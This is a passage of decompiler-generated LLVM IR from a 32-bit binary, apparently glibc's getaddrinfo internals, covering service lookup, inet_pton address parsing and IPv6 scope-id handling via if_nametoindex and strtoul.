  %v1_805d398 = icmp eq i1 %v12_805d396, false
  br i1 %v1_805d398, label %dec_label_pc_805d3ea, label %dec_label_pc_805d39a

dec_label_pc_805d39a:                             ; preds = %dec_label_pc_805d393, %dec_label_pc_805d389
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805d39d = load i32, i32* %v2_805d2b2, align 4
  store i32 %v3_805d39d, i32* %edx.global-to-local, align 4
  %v1_805d3a0 = icmp eq i32 %v3_805d39d, 0
  br i1 %v1_805d3a0, label %dec_label_pc_805d3b1, label %dec_label_pc_805d3a4

dec_label_pc_805d3a4:                             ; preds = %dec_label_pc_805d39a
  %v2_805d3a4 = and i8 %v3_805d380, 2
  %v3_805d3a4 = icmp eq i8 %v2_805d3a4, 0
  %v5_805d3a4 = zext i8 %v2_805d3a4 to i32
  %v7_805d3a4 = and i32 %v4_805d380, -256
  %v8_805d3a4 = or i32 %v7_805d3a4, %v5_805d3a4
  store i32 %v8_805d3a4, i32* @ecx, align 4
  %v1_805d3a7 = icmp eq i1 %v3_805d3a4, false
  br i1 %v1_805d3a7, label %dec_label_pc_805d3b1, label %dec_label_pc_805d3a9

dec_label_pc_805d3a9:                             ; preds = %dec_label_pc_805d3a4
  %v1_805d3a9 = add i32 %v0_805d3b7, 1
  %v2_805d3a9 = inttoptr i32 %v1_805d3a9 to i8*
  %v3_805d3a9 = load i8, i8* %v2_805d3a9, align 1
  %v4_805d3a9 = sext i8 %v3_805d3a9 to i32
  store i32 %v4_805d3a9, i32* %eax.global-to-local, align 4
  %v12_805d3ad = icmp eq i32 %v3_805d39d, %v4_805d3a9
  %v1_805d3af = icmp eq i1 %v12_805d3ad, false
  br i1 %v1_805d3af, label %dec_label_pc_805d3ea, label %dec_label_pc_805d3b1

dec_label_pc_805d3b1:                             ; preds = %dec_label_pc_805d3a9, %dec_label_pc_805d3a4, %dec_label_pc_805d39a
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805d3b7, i32* @edx, align 4
  store i32 %v8_805d3c0, i32* @ebx, align 4
  %v2_805d3c4 = load i32, i32* %v1_805d3c4, align 4
  store i32 %v2_805d3c4, i32* @eax, align 4
  %v2_805d3c6 = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-176)
  store i32 %v2_805d3c6, i32* %eax.global-to-local, align 4
  %v1_805d3ce = icmp eq i32 %v2_805d3c6, 0
  br i1 %v1_805d3ce, label %dec_label_pc_805d3dc, label %dec_label_pc_805d3d2

dec_label_pc_805d3d2:                             ; preds = %dec_label_pc_805d3b1
  %v3_805d3d2 = and i32 %v2_805d3c6, 256
  %v4_805d3d2 = icmp eq i32 %v3_805d3d2, 0
  %v1_805d3d5 = icmp eq i1 %v4_805d3d2, false
  br i1 %v1_805d3d5, label %dec_label_pc_805d3ea, label %dec_label_pc_805dbda

dec_label_pc_805d3dc:                             ; preds = %dec_label_pc_805d3b1
  store i32 %stack_var_-152.161, i32* %edx.global-to-local, align 4
  %v2_805d3e2 = inttoptr i32 %stack_var_-152.161 to i32*
  store i32 %v8_805d3c0, i32* %v2_805d3e2, align 4
  br label %dec_label_pc_805d3ea

dec_label_pc_805d3ea:                             ; preds = %dec_label_pc_805d3d2, %dec_label_pc_805d3a9, %dec_label_pc_805d393, %dec_label_pc_805d380, %dec_label_pc_805d3dc
  %stack_var_-152.0 = phi i32 [ %stack_var_-152.161, %dec_label_pc_805d380 ], [ %v8_805d3c0, %dec_label_pc_805d3dc ], [ %stack_var_-152.161, %dec_label_pc_805d3d2 ], [ %stack_var_-152.161, %dec_label_pc_805d3a9 ], [ %stack_var_-152.161, %dec_label_pc_805d393 ]
  %v0_805d3ea = load i32, i32* @esi, align 4
  %v1_805d3ea = add i32 %v0_805d3ea, 7
  store i32 %v1_805d3ea, i32* @esi, align 4
  %v1_805d3ed = add i32 %v0_805d3ea, 10
  %v2_805d3ed = inttoptr i32 %v1_805d3ed to i8*
  %v3_805d3ed = load i8, i8* %v2_805d3ed, align 1
  %v4_805d3ed = icmp eq i8 %v3_805d3ed, 0
  %v1_805d3f1 = icmp eq i1 %v4_805d3ed, false
  br i1 %v1_805d3f1, label %dec_label_pc_805d380, label %dec_label_pc_805d3f3

dec_label_pc_805d3f3:                             ; preds = %dec_label_pc_805d3ea, %dec_label_pc_805d372
  store i32 %v2_805d25f, i32* %eax.global-to-local, align 4
  %v3_805d3f6 = load i32, i32* %stack_var_-20, align 4
  %v15_805d3f6 = icmp eq i32 %v3_805d3f6, %v2_805d25f
  %v1_805d3f9 = icmp eq i1 %v15_805d3f6, false
  br i1 %v1_805d3f9, label %dec_label_pc_805d4d3, label %dec_label_pc_805dbaa

dec_label_pc_805d404:                             ; preds = %dec_label_pc_805d335
  %v8_805d40b = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805d40b, i32* %eax.global-to-local, align 4
  store i32 %v8_805d40b, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805d417 = inttoptr i32 %v0_805d46d to i8*
  %v2_805d417 = load i8, i8* %v1_805d417, align 1
  %v3_805d417 = sext i8 %v2_805d417 to i32
  store i32 %v8_805d40b, i32* %eax.global-to-local, align 4
  %v2_805d41d = add i32 %v8_805d40b, 4
  %v3_805d41d = inttoptr i32 %v2_805d41d to i32*
  store i32 %v3_805d417, i32* %v3_805d41d, align 4
  %v3_805d420 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d420, i32* %edx.global-to-local, align 4
  %v0_805d423 = load i32, i32* @ebx, align 4
  %v1_805d423 = add i32 %v0_805d423, 2
  %v2_805d423 = inttoptr i32 %v1_805d423 to i8*
  %v3_805d423 = load i8, i8* %v2_805d423, align 1
  %v4_805d423 = and i8 %v3_805d423, 2
  %v5_805d423 = icmp eq i8 %v4_805d423, 0
  br i1 %v5_805d423, label %dec_label_pc_805d431, label %dec_label_pc_805d429

dec_label_pc_805d429:                             ; preds = %dec_label_pc_805d404
  store i32 %arg3, i32* @ecx, align 4
  %v3_805d42c = load i32, i32* %v2_805d2b2, align 4
  br label %dec_label_pc_805d435

dec_label_pc_805d431:                             ; preds = %dec_label_pc_805d404
  %v1_805d431 = add i32 %v0_805d423, 1
  %v2_805d431 = inttoptr i32 %v1_805d431 to i8*
  %v3_805d431 = load i8, i8* %v2_805d431, align 1
  %v4_805d431 = sext i8 %v3_805d431 to i32
  br label %dec_label_pc_805d435

dec_label_pc_805d435:                             ; preds = %dec_label_pc_805d429, %dec_label_pc_805d431
  %storemerge12 = phi i32 [ %v3_805d42c, %dec_label_pc_805d429 ], [ %v4_805d431, %dec_label_pc_805d431 ]
  store i32 %storemerge12, i32* %eax.global-to-local, align 4
  %v2_805d435 = add i32 %v3_805d420, 8
  %v3_805d435 = inttoptr i32 %v2_805d435 to i32*
  store i32 %storemerge12, i32* %v3_805d435, align 4
  %v3_805d438 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d438, i32* %edx.global-to-local, align 4
  %v3_805d43b = load i32, i32* %v2_805d335, align 4
  %v1_805d43e = trunc i32 %v3_805d43b to i16
  %v2_805d43e = call i16 @llvm.bswap.i16(i16 %v1_805d43e)
  %v3_805d43e = zext i16 %v2_805d43e to i32
  store i32 %v3_805d43e, i32* %eax.global-to-local, align 4
  %v2_805d445 = add i32 %v3_805d438, 12
  %v3_805d445 = inttoptr i32 %v2_805d445 to i32*
  store i32 %v3_805d43e, i32* %v3_805d445, align 4
  br label %dec_label_pc_805d4d3

dec_label_pc_805d44d:                             ; preds = %dec_label_pc_805d323
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805d450 = add i32 %arg3, 8
  %v2_805d450 = inttoptr i32 %v1_805d450 to i32*
  %v3_805d450 = load i32, i32* %v2_805d450, align 4
  %v4_805d450 = icmp eq i32 %v3_805d450, 0
  %v1_805d454 = icmp eq i1 %v4_805d450, false
  br i1 %v1_805d454, label %dec_label_pc_805d45a, label %dec_label_pc_805d456

dec_label_pc_805d456:                             ; preds = %dec_label_pc_805d44d
  br i1 %v1_805d2b5, label %dec_label_pc_805d49a, label %dec_label_pc_805d45a

dec_label_pc_805d45a:                             ; preds = %dec_label_pc_805d456, %dec_label_pc_805d44d
  %v8_805d461 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805d461, i32* %eax.global-to-local, align 4
  store i32 %v8_805d461, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805d46d = inttoptr i32 %v0_805d46d to i8*
  %v2_805d46d = load i8, i8* %v1_805d46d, align 1
  %v3_805d46d = sext i8 %v2_805d46d to i32
  store i32 %v8_805d461, i32* %eax.global-to-local, align 4
  %v2_805d473 = add i32 %v8_805d461, 4
  %v3_805d473 = inttoptr i32 %v2_805d473 to i32*
  store i32 %v3_805d46d, i32* %v3_805d473, align 4
  %v3_805d476 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d476, i32* %edx.global-to-local, align 4
  %v0_805d479 = load i32, i32* @ebx, align 4
  %v1_805d479 = add i32 %v0_805d479, 2
  %v2_805d479 = inttoptr i32 %v1_805d479 to i8*
  %v3_805d479 = load i8, i8* %v2_805d479, align 1
  %v4_805d479 = and i8 %v3_805d479, 2
  %v5_805d479 = icmp eq i8 %v4_805d479, 0
  br i1 %v5_805d479, label %dec_label_pc_805d487, label %dec_label_pc_805d47f

dec_label_pc_805d47f:                             ; preds = %dec_label_pc_805d45a
  store i32 %arg3, i32* @ecx, align 4
  %v3_805d482 = load i32, i32* %v2_805d2b2, align 4
  br label %dec_label_pc_805d48b

dec_label_pc_805d487:                             ; preds = %dec_label_pc_805d45a
  %v1_805d487 = add i32 %v0_805d479, 1
  %v2_805d487 = inttoptr i32 %v1_805d487 to i8*
  %v3_805d487 = load i8, i8* %v2_805d487, align 1
  %v4_805d487 = sext i8 %v3_805d487 to i32
  br label %dec_label_pc_805d48b

dec_label_pc_805d48b:                             ; preds = %dec_label_pc_805d47f, %dec_label_pc_805d487
  %storemerge13 = phi i32 [ %v3_805d482, %dec_label_pc_805d47f ], [ %v4_805d487, %dec_label_pc_805d487 ]
  %v2_805d48b = add i32 %v3_805d476, 8
  %v3_805d48b = inttoptr i32 %v2_805d48b to i32*
  store i32 %storemerge13, i32* %v3_805d48b, align 4
  %v3_805d48e = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d48e, i32* %eax.global-to-local, align 4
  %v1_805d491 = add i32 %v3_805d48e, 12
  %v2_805d491 = inttoptr i32 %v1_805d491 to i32*
  store i32 0, i32* %v2_805d491, align 4
  br label %dec_label_pc_805d4d3

dec_label_pc_805d49a:                             ; preds = %dec_label_pc_805d456
  %v1_805d49a = add i32 %v0_805d46d, 7
  store i32 %v1_805d49a, i32* @ecx, align 4
  %v8_805d4a9 = ptrtoint i32* %stack_var_-176 to i32
  %storemerge14193 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %storemerge14193, i32* @ebx, align 4
  %v1_805d4cd194 = add i32 %v0_805d46d, 10
  %v2_805d4cd195 = inttoptr i32 %v1_805d4cd194 to i8*
  %v3_805d4cd196 = load i8, i8* %v2_805d4cd195, align 1
  %v4_805d4cd197 = icmp eq i8 %v3_805d4cd196, 0
  %v1_805d4d1198 = icmp eq i1 %v4_805d4cd197, false
  br i1 %v1_805d4d1198, label %dec_label_pc_805d4a2, label %dec_label_pc_805d4d3

dec_label_pc_805d4a2:                             ; preds = %dec_label_pc_805d49a, %dec_label_pc_805d4a2
  %storemerge14.in200 = phi i32* [ %stack_var_-176, %dec_label_pc_805d4a2 ], [ %stack_var_-20, %dec_label_pc_805d49a ]
  %v0_805d4c6199 = phi i32 [ %v1_805d4c6, %dec_label_pc_805d4a2 ], [ %v1_805d49a, %dec_label_pc_805d49a ]
  store i32 %v8_805d4a9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805d4b2 = inttoptr i32 %v0_805d4c6199 to i8*
  %v2_805d4b2 = load i8, i8* %v1_805d4b2, align 1
  %v3_805d4b2 = sext i8 %v2_805d4b2 to i32
  store i32 %v3_805d4b2, i32* %edx.global-to-local, align 4
  %v1_805d4b8 = add i32 %v0_805d4c6199, 1
  %v2_805d4b8 = inttoptr i32 %v1_805d4b8 to i8*
  %v3_805d4b8 = load i8, i8* %v2_805d4b8, align 1
  %v4_805d4b8 = sext i8 %v3_805d4b8 to i32
  store i32 %v4_805d4b8, i32* %edx.global-to-local, align 4
  %v1_805d4c6 = add i32 %v0_805d4c6199, 7
  store i32 %v1_805d4c6, i32* @ecx, align 4
  store i32 %v8_805d4a9, i32* %storemerge14.in200, align 4
  store i32 %v8_805d4a9, i32* @ebx, align 4
  %v1_805d4cd = add i32 %v0_805d4c6199, 10
  %v2_805d4cd = inttoptr i32 %v1_805d4cd to i8*
  %v3_805d4cd = load i8, i8* %v2_805d4cd, align 1
  %v4_805d4cd = icmp eq i8 %v3_805d4cd, 0
  %v1_805d4d1 = icmp eq i1 %v4_805d4cd, false
  br i1 %v1_805d4d1, label %dec_label_pc_805d4a2, label %dec_label_pc_805d4d3

dec_label_pc_805d4d3:                             ; preds = %dec_label_pc_805d49a, %dec_label_pc_805d4a2, %dec_label_pc_805d3f3, %dec_label_pc_805d345, %dec_label_pc_805d48b, %dec_label_pc_805d435
  %v3_805d4d3 = load i8*, i8** %stack_var_4, align 4
  %v5_805d4d3 = icmp eq i8* %v3_805d4d3, null
  %v12_805d86e = ptrtoint i32* %stack_var_-236 to i32
  %v2_805d871 = ptrtoint i32* %stack_var_-221 to i32
  store i32 %v2_805d871, i32* %eax.global-to-local, align 4
  br i1 %v5_805d4d3, label %dec_label_pc_805d86e, label %dec_label_pc_805d4dd

dec_label_pc_805d4dd:                             ; preds = %dec_label_pc_805d4d3
  %v8_805d4e4 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v8_805d4e4, i32* %stack_var_-24, align 4
  %v1_805d4f4 = add i32 %v8_805d4e4, 24
  %v2_805d4f4 = inttoptr i32 %v1_805d4f4 to i32*
  store i32 0, i32* %v2_805d4f4, align 4
  %v3_805d4fb = load i32, i32* %stack_var_-24, align 4
  %v1_805d4fe = inttoptr i32 %v3_805d4fb to i32*
  store i32 0, i32* %v1_805d4fe, align 4
  %v0_805d504 = load i32, i32* @esi, align 4
  %v3_805d505 = load i32, i32* %stack_var_-24, align 4
  %v1_805d508 = add i32 %v3_805d505, 8
  store i32 %v1_805d508, i32* %eax.global-to-local, align 4
  %v3_805d50c = load i8*, i8** %stack_var_4, align 4
  %v4_805d50c = ptrtoint i8* %v3_805d50c to i32
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-252, align 4
  %v5_805d511 = call i32 @inet_pton(i32 2, i8* %v3_805d50c, i32 %v1_805d508)
  store i32 %v5_805d511, i32* %eax.global-to-local, align 4
  %tmp155 = icmp slt i32 %v5_805d511, 1
  br i1 %tmp155, label %dec_label_pc_805d543, label %dec_label_pc_805d51d

dec_label_pc_805d51d:                             ; preds = %dec_label_pc_805d4dd
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805d520 = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d520, i32* %eax.global-to-local, align 4
  %v1_805d523 = icmp eq i32 %v3_805d520, 0
  br i1 %v1_805d523, label %dec_label_pc_805d539, label %dec_label_pc_805d527

dec_label_pc_805d527:                             ; preds = %dec_label_pc_805d51d
  %v9_805d527 = icmp eq i32 %v3_805d520, 2
  br i1 %v9_805d527, label %dec_label_pc_805d539, label %dec_label_pc_805d52c

dec_label_pc_805d52c:                             ; preds = %dec_label_pc_805d527
  %v3_805d52c = load i32, i32* %stack_var_-156, align 4
  %v4_805d52c = icmp eq i32 %v3_805d52c, 0
  br i1 %v4_805d52c, label %dec_label_pc_805dbb1, label %dec_label_pc_805d539

dec_label_pc_805d539:                             ; preds = %dec_label_pc_805d52c, %dec_label_pc_805d527, %dec_label_pc_805d51d
  %v3_805d539 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d539, i32* %eax.global-to-local, align 4
  %v1_805d53c = add i32 %v3_805d539, 4
  %v2_805d53c = inttoptr i32 %v1_805d53c to i32*
  store i32 2, i32* %v2_805d53c, align 4
  br label %dec_label_pc_805d543

dec_label_pc_805d543:                             ; preds = %dec_label_pc_805d4dd, %dec_label_pc_805d539
  %v3_805d543 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d543, i32* %eax.global-to-local, align 4
  %v1_805d546 = add i32 %v3_805d543, 4
  %v2_805d546 = inttoptr i32 %v1_805d546 to i32*
  %v3_805d546 = load i32, i32* %v2_805d546, align 4
  %v4_805d546 = icmp eq i32 %v3_805d546, 0
  %v1_805d54a = icmp eq i1 %v4_805d546, false
  br i1 %v1_805d54a, label %dec_label_pc_805d633, label %dec_label_pc_805d550

dec_label_pc_805d550:                             ; preds = %dec_label_pc_805d543
  %tmp156 = bitcast i8** %stack_var_4 to i32*
  %v3_805d5536 = load i32, i32* %tmp156, align 4
  %tmp157 = bitcast i8** %stack_var_-252 to i32*
  store i32 %v3_805d5536, i32* %tmp157, align 4
  %v0_805d556.cast = inttoptr i32 %v3_805d5536 to i8*
  %v3_805d556 = call i32 @strlen(i8* %v0_805d556.cast)
  %v1_805d55e = add i32 %v3_805d556, 1
  store i32 %v1_805d55e, i32* %edx.global-to-local, align 4
  %v1_805d561 = add i32 %v3_805d556, 31
  %v1_805d564 = and i32 %v1_805d561, -16
  %v2_805d567 = sub i32 %v12_805d86e, %v1_805d564
  %v1_805d569 = add i32 %v2_805d567, 15
  store i32 %v1_805d569, i32* %eax.global-to-local, align 4
  %v0_805d56d = load i32, i32* @ebx, align 4
  %v2_805d56d = add i32 %v2_805d567, -4
  %v3_805d56d = inttoptr i32 %v2_805d56d to i32*
  store i32 %v0_805d56d, i32* %v3_805d56d, align 4
  %v0_805d56e = load i32, i32* %edx.global-to-local, align 4
  %v2_805d56e = add i32 %v2_805d567, -8
  %v3_805d56e = inttoptr i32 %v2_805d56e to i32*
  store i32 %v0_805d56e, i32* %v3_805d56e, align 4
  %v0_805d56f = load i32, i32* %eax.global-to-local, align 4
  %v1_805d56f = and i32 %v0_805d56f, -16
  store i32 %v1_805d56f, i32* %eax.global-to-local, align 4
  %v3_805d572 = load i8*, i8** %stack_var_4, align 4
  %v4_805d572 = ptrtoint i8* %v3_805d572 to i32
  %v6_805d572 = add i32 %v2_805d567, -12
  %v7_805d572 = inttoptr i32 %v6_805d572 to i32*
  store i32 %v4_805d572, i32* %v7_805d572, align 4
  %v0_805d575 = load i32, i32* %eax.global-to-local, align 4
  %v2_805d575 = add i32 %v2_805d567, -16
  %v3_805d575 = inttoptr i32 %v2_805d575 to i32*
  store i32 %v0_805d575, i32* %v3_805d575, align 4
  %v0_805d576 = load i8*, i8** %stack_var_-252, align 4
  %tmp158 = bitcast i8* %v0_805d576 to i16*
  %v5_805d576 = call i32 @memcpy(i16* %tmp158, i32 %v4_805d50c, i32 %v1_805d508)
  store i32 %v5_805d576, i32* %eax.global-to-local, align 4
  %v0_805d57b = load i32, i32* @esp, align 4
  %v1_805d57b = inttoptr i32 %v0_805d57b to i32*
  %v2_805d57b = load i32, i32* %v1_805d57b, align 4
  store i32 %v2_805d57b, i32* %edx.global-to-local, align 4
  %v3_805d57b = add i32 %v0_805d57b, 4
  %v1_805d57c = inttoptr i32 %v3_805d57b to i32*
  %v2_805d57c = load i32, i32* %v1_805d57c, align 4
  store i32 %v2_805d57c, i32* @ecx, align 4
  store i32 37, i32* %v1_805d57c, align 4
  store i32 %v5_805d576, i32* @ebx, align 4
  store i32 %v5_805d576, i32* %v1_805d57b, align 4
  %v0_805d582 = load i8*, i8** %stack_var_-252, align 4
  %v4_805d582 = call i32 @__GI_strchr(i8* %v0_805d582, i32 %v4_805d50c)
  store i32 %v4_805d582, i32* %eax.global-to-local, align 4
  %v0_805d587 = load i32, i32* @esp, align 4
  %v1_805d587 = add i32 %v0_805d587, 16
  store i32 %v4_805d582, i32* @esi, align 4
  %v2_805d58c = icmp eq i32 %v4_805d582, 0
  br i1 %v2_805d58c, label %dec_label_pc_805d593, label %dec_label_pc_805d590

dec_label_pc_805d590:                             ; preds = %dec_label_pc_805d550
  %v5_805d582 = inttoptr i32 %v4_805d582 to i8*
  store i8 0, i8* %v5_805d582, align 1
  %v2_805d593.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805d593

dec_label_pc_805d593:                             ; preds = %dec_label_pc_805d550, %dec_label_pc_805d590
  %v2_805d593 = phi i32 [ %v1_805d587, %dec_label_pc_805d550 ], [ %v2_805d593.pre, %dec_label_pc_805d590 ]
  %v3_805d593 = add i32 %v2_805d593, -4
  %v4_805d593 = inttoptr i32 %v3_805d593 to i32*
  store i32 %v4_805d582, i32* %v4_805d593, align 4
  %v3_805d594 = load i32, i32* %stack_var_-24, align 4
  %v1_805d597 = add i32 %v3_805d594, 8
  store i32 %v1_805d597, i32* %eax.global-to-local, align 4
  %v2_805d59a = add i32 %v2_805d593, -8
  %v3_805d59a = inttoptr i32 %v2_805d59a to i32*
  store i32 %v1_805d597, i32* %v3_805d59a, align 4
  %v0_805d59b = load i32, i32* @ebx, align 4
  %v2_805d59b = add i32 %v2_805d593, -12
  %v3_805d59b = inttoptr i32 %v2_805d59b to i32*
  store i32 %v0_805d59b, i32* %v3_805d59b, align 4
  %v1_805d59c = add i32 %v2_805d593, -16
  %v2_805d59c = inttoptr i32 %v1_805d59c to i32*
  store i32 10, i32* %v2_805d59c, align 4
  %v0_805d59e = load i8*, i8** %stack_var_-252, align 4
  %v1_805d59e = ptrtoint i8* %v0_805d59e to i32
  %v5_805d59e = call i32 @inet_pton(i32 %v1_805d59e, i8* %v3_805d50c, i32 %v1_805d508)
  store i32 %v5_805d59e, i32* %eax.global-to-local, align 4
  %tmp159 = icmp slt i32 %v5_805d59e, 1
  br i1 %tmp159, label %dec_label_pc_805d633, label %dec_label_pc_805d5ae

dec_label_pc_805d5ae:                             ; preds = %dec_label_pc_805d593
  store i32 %arg3, i32* @ecx, align 4
  %v3_805d5b1 = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d5b1, i32* %eax.global-to-local, align 4
  %v1_805d5b4 = icmp eq i32 %v3_805d5b1, 0
  br i1 %v1_805d5b4, label %dec_label_pc_805d5c1, label %dec_label_pc_805d5b8

dec_label_pc_805d5b8:                             ; preds = %dec_label_pc_805d5ae
  %v9_805d5b8 = icmp eq i32 %v3_805d5b1, 10
  %v1_805d5bb = icmp eq i1 %v9_805d5b8, false
  br i1 %v1_805d5bb, label %dec_label_pc_805dbb1, label %dec_label_pc_805d5c1

dec_label_pc_805d5c1:                             ; preds = %dec_label_pc_805d5b8, %dec_label_pc_805d5ae
  %v3_805d5c1 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d5c1, i32* %eax.global-to-local, align 4
  %v1_805d5c6 = add i32 %v3_805d5c1, 4
  %v2_805d5c6 = inttoptr i32 %v1_805d5c6 to i32*
  store i32 10, i32* %v2_805d5c6, align 4
  br i1 %v2_805d58c, label %dec_label_pc_805d633, label %dec_label_pc_805d5cf

dec_label_pc_805d5cf:                             ; preds = %dec_label_pc_805d5c1
  %v3_805d5cf = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d5cf, i32* @ebx, align 4
  %v1_805d5d2 = add i32 %v3_805d5cf, 8
  %v2_805d5d2 = inttoptr i32 %v1_805d5d2 to i32*
  %v3_805d5d2 = load i32, i32* %v2_805d5d2, align 4
  %v1_805d5d5 = and i32 %v3_805d5d2, 49407
  store i32 %v1_805d5d5, i32* %eax.global-to-local, align 4
  %v9_805d5da = icmp eq i32 %v1_805d5d5, 33022
  br i1 %v9_805d5da, label %dec_label_pc_805d5f3, label %dec_label_pc_805d5e1

dec_label_pc_805d5e1:                             ; preds = %dec_label_pc_805d5cf
  %v2_805d5e1 = inttoptr i32 %v1_805d5d2 to i8*
  %v3_805d5e1 = load i8, i8* %v2_805d5e1, align 1
  %v13_805d5e1 = icmp eq i8 %v3_805d5e1, -1
  %v1_805d5e5 = icmp eq i1 %v13_805d5e1, false
  br i1 %v1_805d5e5, label %dec_label_pc_805d60e, label %dec_label_pc_805d5e7

dec_label_pc_805d5e7:                             ; preds = %dec_label_pc_805d5e1
  %v1_805d5e7 = add i32 %v3_805d5cf, 9
  %v2_805d5e7 = inttoptr i32 %v1_805d5e7 to i8*
  %v3_805d5e7 = load i8, i8* %v2_805d5e7, align 1
  %tmp = urem i8 %v3_805d5e7, 16
  %v1_805d5eb = zext i8 %tmp to i32
  store i32 %v1_805d5eb, i32* %eax.global-to-local, align 4
  %v9_805d5ee = icmp eq i8 %tmp, 2
  %v1_805d5f1 = icmp eq i1 %v9_805d5ee, false
  br i1 %v1_805d5f1, label %dec_label_pc_805d60e, label %dec_label_pc_805d5f3

dec_label_pc_805d5f3:                             ; preds = %dec_label_pc_805d5e7, %dec_label_pc_805d5cf
  %v0_805d5f3 = load i32, i32* @esp, align 4
  %v1_805d5f6 = add i32 %v4_805d582, 1
  store i32 %v1_805d5f6, i32* %eax.global-to-local, align 4
  %v2_805d5f9 = add i32 %v0_805d5f3, -16
  %v3_805d5f9 = inttoptr i32 %v2_805d5f9 to i32*
  store i32 %v1_805d5f6, i32* %v3_805d5f9, align 4
  %v0_805d5fa = call i32 @__GI_if_nametoindex()
  %v1_805d5ff = load i32, i32* @ebx, align 4
  %v2_805d5ff = add i32 %v1_805d5ff, 24
  %v3_805d5ff = inttoptr i32 %v2_805d5ff to i32*
  store i32 %v0_805d5fa, i32* %v3_805d5ff, align 4
  %v3_805d605 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d605, i32* %eax.global-to-local, align 4
  %v1_805d608 = add i32 %v3_805d605, 24
  %v2_805d608 = inttoptr i32 %v1_805d608 to i32*
  %v3_805d608 = load i32, i32* %v2_805d608, align 4
  %v4_805d608 = icmp eq i32 %v3_805d608, 0
  %v1_805d60c = icmp eq i1 %v4_805d608, false
  br i1 %v1_805d60c, label %dec_label_pc_805d633, label %dec_label_pc_805d60e

dec_label_pc_805d60e:                             ; preds = %dec_label_pc_805d5f3, %dec_label_pc_805d5e7, %dec_label_pc_805d5e1
  %v0_805d60e = phi i32 [ %v3_805d605, %dec_label_pc_805d5f3 ], [ %v1_805d5eb, %dec_label_pc_805d5e7 ], [ %v1_805d5d5, %dec_label_pc_805d5e1 ]
  %v1_805d60e = load i32, i32* @esp, align 4
  %v2_805d60e = add i32 %v1_805d60e, -4
  %v3_805d60e = inttoptr i32 %v2_805d60e to i32*
  store i32 %v0_805d60e, i32* %v3_805d60e, align 4
  %v2_805d60f = ptrtoint i8** %stack_var_-32 to i32
  %v1_805d612 = add i32 %v1_805d60e, -8
  %v2_805d612 = inttoptr i32 %v1_805d612 to i32*
  store i32 10, i32* %v2_805d612, align 4
  %v2_805d614 = add i32 %v1_805d60e, -12
  %v3_805d614 = inttoptr i32 %v2_805d614 to i32*
  store i32 %v2_805d60f, i32* %v3_805d614, align 4
  %v1_805d615 = add i32 %v4_805d582, 1
  store i32 %v1_805d615, i32* %eax.global-to-local, align 4
  %v3_805d618 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d618, i32* @ebx, align 4
  %v2_805d61b = add i32 %v1_805d60e, -16
  %v3_805d61b = inttoptr i32 %v2_805d61b to i32*
  store i32 %v1_805d615, i32* %v3_805d61b, align 4
  %v0_805d61c = load i8*, i8** %stack_var_-252, align 4
  %v1_805d61c = ptrtoint i8* %v0_805d61c to i32
  %v5_805d61c = call i32 @strtoul(i32 %v1_805d61c, i32 %v4_805d50c, i32 %v1_805d508, i32 %v0_805d504)
  %v1_805d621 = load i32, i32* @ebx, align 4
  %v2_805d621 = add i32 %v1_805d621, 24
  %v3_805d621 = inttoptr i32 %v2_805d621 to i32*
  store i32 %v5_805d61c, i32* %v3_805d621, align 4
  %v3_805d627 = load i8*, i8** %stack_var_-32, align 4
  %v4_805d627 = ptrtoint i8* %v3_805d627 to i32
  store i32 %v4_805d627, i32* %eax.global-to-local, align 4
  %v2_805d62a = load i8, i8* %v3_805d627, align 1
  %v3_805d62a = icmp eq i8 %v2_805d62a, 0
  %v1_805d62d = icmp eq i1 %v3_805d62a, false
  br i1 %v1_805d62d, label %dec_label_pc_805dbb8, label %dec_label_pc_805d633

dec_label_pc_805d633:                             ; preds = %dec_label_pc_805d60e, %dec_label_pc_805d5f3, %dec_label_pc_805d5c1, %dec_label_pc_805d593, %dec_label_pc_805d543
  %v3_805d633 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d633, i32* %eax.global-to-local, align 4
  %v1_805d636 = add i32 %v3_805d633, 4
  %v2_805d636 = inttoptr i32 %v1_805d636 to i32*
  %v3_805d636 = load i32, i32* %v2_805d636, align 4
  %v4_805d636 = icmp eq i32 %v3_805d636, 0
  %v1_805d63a = icmp eq i1 %v4_805d636, false
  br i1 %v1_805d63a, label %dec_label_pc_805d85c, label %dec_label_pc_805d640

dec_label_pc_805d640:                             ; preds = %dec_label_pc_805d633
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d643 = load i8, i8* %tmp118, align 1
  %v3_805d643 = and i8 %v2_805d643, 4
  %v4_805d643 = icmp eq i8 %v3_805d643, 0
  %v1_805d646 = icmp eq i1 %v4_805d643, false
  br i1 %v1_805d646, label %dec_label_pc_805d85c, label %dec_label_pc_805d64c

dec_label_pc_805d64c:                             ; preds = %dec_label_pc_805d640
  %v3_805d64c = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d64c, i32* %eax.global-to-local, align 4
  %v1_805d64f = icmp eq i32 %v3_805d64c, 0
  br i1 %v1_805d64f, label %dec_label_pc_805d660, label %dec_label_pc_805d653

